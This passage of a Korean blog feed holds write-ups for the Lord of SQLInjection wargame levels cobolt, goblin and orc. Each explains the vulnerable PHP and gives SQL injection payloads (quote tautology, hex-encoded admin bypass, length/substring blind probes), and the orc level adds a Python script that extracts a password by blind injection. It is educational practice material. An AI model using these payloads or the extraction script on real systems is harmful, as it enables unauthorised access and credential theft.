<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_cobolt where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=md5(&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>
<p><br><br></p>
<h1 id="🚩-SOLVE"><a href="#🚩-SOLVE" class="headerlink" title="🚩 SOLVE"></a>🚩 SOLVE</h1><br>

<p><code>id</code> 부분에 <code>admin&#39; or &#39;1&#39; = &#39;1</code>를 넣어주고 <code>pw</code>에 아무 문자를 넣어주었습니다.<br><br><br></p>
<img src = "/images/Lord of SQLInjection/cobolt/solved.png">
<br><br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [3번_goblin] Write UP</title>
    <url>/2021/09/27/2021-09-27-Lord_of_SQLInjection_3_goblin/</url>
    <content><![CDATA[<h1 id="😐-전체-소스코드"><a href="#😐-전체-소스코드" class="headerlink" title="😐 전체 소스코드"></a>😐 전체 소스코드</h1><br>

<p>3번 문제인 goblin을 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/goblin/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;|\&quot;|\`/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Quotes ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_goblin where id=&#x27;guest&#x27; and no=<span class="subst">&#123;$_GET[no]&#125;</span>&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;goblin&quot;</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="💡-중요-소스코드-해석"><a href="#💡-중요-소스코드-해석" class="headerlink" title="💡 중요 소스코드 해석"></a>💡 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;|\&quot;|\`/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Quotes ~_~&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_goblin where id=&#x27;guest&#x27; and no=<span class="subst">&#123;$_GET[no]&#125;</span>&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;goblin&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>조건문</code>과 <code>query문</code>이 있고 <code>id</code> 파라미터가 <code>admin</code> 이어야 하는 <code>조건문</code>도 있습니다.</p>
<br>

<br>

<h2 id="첫번째-amp-두번째-줄-해석"><a href="#첫번째-amp-두번째-줄-해석" class="headerlink" title="첫번째 &amp; 두번째 줄 해석"></a>첫번째 &amp; 두번째 줄 해석</h2><p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p><code>prob</code>문자열과 특수문자 <code>_</code> <code>.</code> <code>()</code> 를 필터링 하고있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;|\&quot;|\`/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Quotes ~_~&quot;</span>);</span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="세번째-줄-해석"><a href="#세번째-줄-해석" class="headerlink" title="세번째 줄 해석"></a>세번째 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_goblin where id=&#x27;guest&#x27; and no=<span class="subst">&#123;$_GET[no]&#125;</span>&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>쿼리문을 보면 id에 <code>guest</code>를 고정해두고 <code>no</code>를 파라미터에서 받아오는 것을 볼 수 있습니다.</p>
<br>

<br>

<h2 id="네번째-amp-다섯번째-줄-해석"><a href="#네번째-amp-다섯번째-줄-해석" class="headerlink" title="네번째 &amp; 다섯번째 줄 해석"></a>네번째 &amp; 다섯번째 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;goblin&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>php에서 실행된 쿼리를 <code>result</code>변수에 넣습니다.</p>
<p><code>result[&#39;id&#39;]</code>가 <code>admin</code>이어야 하는 조건문이 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🎉-SOLVE"><a href="#🎉-SOLVE" class="headerlink" title="🎉 SOLVE"></a>🎉 SOLVE</h1><br>

<img src="/images/Lord of SQLInjection/goblin/guest.png">

<br>

<p><code>no</code> 파라미터에 <code>1</code>을 넣었더니 Hello guest가 나오는 것을 보아 <code>1</code>은 guest 값인 것을 알 수 있습니다.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 예상 DB</span></span><br><span class="line"></span><br><span class="line">+-------+----+</span><br><span class="line">| id    | no |</span><br><span class="line">+-------+----+</span><br><span class="line">| guest | <span class="number">1</span>  |</span><br><span class="line">| admin | ?  |</span><br><span class="line">+-------+----+</span><br></pre></td></tr></table></figure>

<br>

<br>

<p><code>no</code>파라미터를 조작해서 쿼리문의 <code>id</code>값을 <code>admin</code>으로 바꿔줘야 합니다.</p>
<p><code>?no=2 or id=&#39;admin&#39;</code>으로 조작을 시도하면 두번째 줄의 <code>preg_match</code> 함수로 필터링이 됩니다.</p>
<br>

<br>

<p><code>&#39;admin&#39;</code>을 <code>16진수</code>로 변환하여 넣었습니다.</p>
<p><code>admin</code>을 <code>16진수</code>로 변환하면 아래와 같이 나옵니다.</p>
<img src="/images/Lord of SQLInjection/goblin/hex.png">

<br>

<br>

<p><code>?no=2 or id=0x61646d696e</code>을 해주니 <code>id</code>가 <code>admin</code>이 됐습니다.</p>
<img src="/images/Lord of SQLInjection/goblin/solved.png">

<br>

<br>

<p>쿼리문에 <code>select id from prob_goblin where id=&#39;guest&#39; and no=2 or id=0x61646d696e</code> 이렇게 들어가면</p>
<p><code>id=&#39;gest&#39; and no=2</code>는 거짓이 되고 <code>id=0x61646d696e</code>가 들어가게 됩니다.</p>
<br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write Up</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [4번_orc] Write UP</title>
    <url>/2021/09/28/2021-09-28-Lord_of_SQLInjection_4_orc/</url>
    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>

<p>4번 문제인 orc를 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/orc/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello admin&lt;/h2&gt;&quot;</span>; </span><br><span class="line">   </span><br><span class="line">  <span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;orc&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello admin&lt;/h2&gt;&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select pw from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;orc&quot;</span>); </span><br></pre></td></tr></table></figure>

<p><code>조건문</code>과 <code>query문</code>, <code>addslashes 함수</code>, <code>pw</code> 변수 값과 <code>GET으로 받아온 pw 파라미터 값</code>이 같아야 한다는 <code>조건문</code>이 있습니다.</p>
<br>

<br>

<h2 id="첫번째-줄-해석"><a href="#첫번째-줄-해석" class="headerlink" title="첫번째 줄 해석"></a>첫번째 줄 해석</h2><p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p><code>prob</code>문자열과 특수문자 <code>_</code> <code>.</code> <code>()</code> 를 필터링 하고있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="두번째-amp-세번째-amp-네번째-줄-해석"><a href="#두번째-amp-세번째-amp-네번째-줄-해석" class="headerlink" title="두번째 &amp; 세번째 &amp; 네번째 줄 해석"></a>두번째 &amp; 세번째 &amp; 네번째 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello admin&lt;/h2&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>prob_orc</code> 테이블에서 <code>id</code>가 <code>admin</code>이고 <code>pw</code>가 참이면 <code>id</code> 값을 <code>query</code>변수에 저장하고 있습니다.</p>
<p>만약 <code>result[&#39;id&#39;]</code>가 있다면 Hello admin을 출력시킵니다.</p>
<br>

<br>

<h2 id="여섯번째-줄-해석"><a href="#여섯번째-줄-해석" class="headerlink" title="여섯번째 줄 해석"></a>여섯번째 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]);</span><br></pre></td></tr></table></figure>

<p><code>addslashes</code>함수는 <code>&#39;</code>, <code>&quot;</code>, <code>NULL</code> 같은 특수 문자들을 포함하고 있는 문자열에 <code>\</code>을 넣음으로써 쿼리문에서의 오류를 없애줍니다.</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">예) pw 가 passwd&#x27;s 이면</span><br><span class="line">   </span><br><span class="line">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;passwd&#x27;s&#x27;&quot; → 오류</span><br><span class="line">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;passwd\&#x27;s&#x27;&quot; → &#x27;를 \&#x27;로 바꿔줍니다</span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="일곱번째-amp-여덟번째-amp-아홉번째-줄-해석"><a href="#일곱번째-amp-여덟번째-amp-아홉번째-줄-해석" class="headerlink" title="일곱번째 &amp; 여덟번째 &amp; 아홉번째 줄 해석"></a>일곱번째 &amp; 여덟번째 &amp; 아홉번째 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select pw from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;orc&quot;</span>); </span><br></pre></td></tr></table></figure>

<p><code>addslashes</code>함수로 <code>&#39;</code>, <code>&quot;</code>, <code>NULL</code>을 필터링 한 쿼리문을 다시 실행시키고 <code>result[&#39;pw&#39;]</code>값과 <code>GET 으로 받은 pw 파라미터</code> 값이 같으면 문제가 풀립니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>

<img src="/images/Lord of SQLInjection/orc/solve_1.png">

<br>

<p><code>pw</code> 파라미터를 참으로 만들어주니 Hello admin이 출력되었습니다.</p>
<p>이제 중간에 <code>addslashes</code>함수를 우회하고 <code>result[&#39;pw&#39;]</code> 값을 알아내야합니다.</p>
<br>

<br>

<p><code>pw</code>를 알아내기 위해 <code>Blind SQL Injection</code>을 사용하였습니다.</p>
<br>

<p><code>?pw=1&#39; or id=&#39;admin&#39; and length(pw)=&#39;1</code><br>mysql의 <code>length</code> 함수를 사용하여 길이를 구해줍니다.</p>
<br>

<p><code>?pw=1&#39; or id=&#39;admin&#39; and substring(pw,1,1)=&#39;0</code><br>mysql의 <code>substring</code> 함수를 사용하여 <code>pw</code>를 하나 씩 추출하여 참인지 확인해야 합니다.</p>
<br>

<p><code>substring(str, pos, len)</code> 함수의 인자를 설명하겠습니다.</p>
<p><code>str</code> : 원본 문자열</p>
<p><code>pos</code> : 시작 위치 값</p>
<p><code>len</code> : 가져올 길이 값</p>
<br>

<p>예를 들어 <code>substring(pw, 1, 1)</code> 이면 <code>pw</code> 문자열에서 <code>첫번째 위치</code>에 있는 문자 <code>한 개</code> 추출해 오는 것 입니다.</p>
<br>

<p><code>pw</code>의 길이부터 <code>숫자 0~9</code>까지 <code>알파벳 대소문자 a~z</code>까지 하나 씩 구해야 하기 때문에 시간이 많이 필요합니다.</p>
<p>파이썬을 통해 자동으로 빠르게 <code>pw</code>값을 추출할 수 있습니다.</p>
<br>

<br>

<h2 id="파이썬-코드"><a href="#파이썬-코드" class="headerlink" title="파이썬 코드"></a>파이썬 코드</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=1&#x27; or id=&#x27;admin&#x27; and &quot;</span></span><br><span class="line">head = &#123;<span class="string">&#x27;Cookie&#x27;</span> : <span class="string">&#x27;PHPSESSID=hs9ec08q7cfg9e4b8opujaufgg&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line">pwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    query = <span class="string">&quot;length(pw)=&#x27;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(length)</span><br><span class="line">    req = requests.get(url+query, headers=head)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[ +&quot;</span>,length,<span class="string">&quot;]&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Hello admin&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;총 길이는&quot;</span>,length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length = length + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">122</span>):</span><br><span class="line">        query = <span class="string">&quot;substring(pw,&#123;&#125;,1) = &#x27;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i),<span class="built_in">chr</span>(j))</span><br><span class="line">        req = requests.get(url+query, headers=head)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello admin&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            <span class="built_in">print</span>(pwd)</span><br><span class="line">            pwd = pwd + <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(pwd)</span><br></pre></td></tr></table></figure>



<p>url을 적어 줍니다. <code>?pw=1&#39; or id=&#39;admin&#39; and </code>까지 동일하기 때문에 이 부분까지 작성하였습니다.</p>
<p>본 워게임 사이트는 로그인이 필요한 사이트이므로 쿠키 값을 head 변수에 넣어줬습니다.</p>
<br>

<p>먼저 <code>pw</code>의 길이를 구해줬습니다.</p>
<p>무한 루프를 돌려 “Hello admin” 이라는 문자열이 나올때까지 <code>length</code>값을 1씩 더해줍니다.</p>
<br>

<p><code>substring</code> 함수를 사용한 문자 추출은 중첩 반복문을 사용해 구해줬습니다.</p>
<p><code>i</code>는 1부터 <code>length + 1</code> 값 까지 돌아갑니다.</p>
<p><code>j</code>는 아스키코드 <code>48 ~ 122</code>까지 돌아갑니다.</p>
<br>

<img src="/images/Lord of SQLInjection/orc/solve_2.png">

<br>

<p>자동으로 <code>pw</code>의 길이를 구해 줍니다.</p>
<br>

<br>

<img src="/images/Lord of SQLInjection/orc/solve_3.png">

<br>

<p>자동으로 <code>pw</code>의 값을 구해 줍니다.</p>
<br>

<br>

<p>파이썬 코드를 돌려서 나온 <code>pw</code> 값을 넣어주면 문제가 풀립니다.</p>
<img src="/images/Lord of SQLInjection/orc/solve_4.png">

<br>

<p><code>substring</code>으로 4번째 문자를 추출해보면 ‘A’ 대문자인데? Clear가 안되어 소문자 ‘a’를 써주니 Clear 됐다!</p>
<br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write Up</tag>
      </tags>
  </entry>
</search>
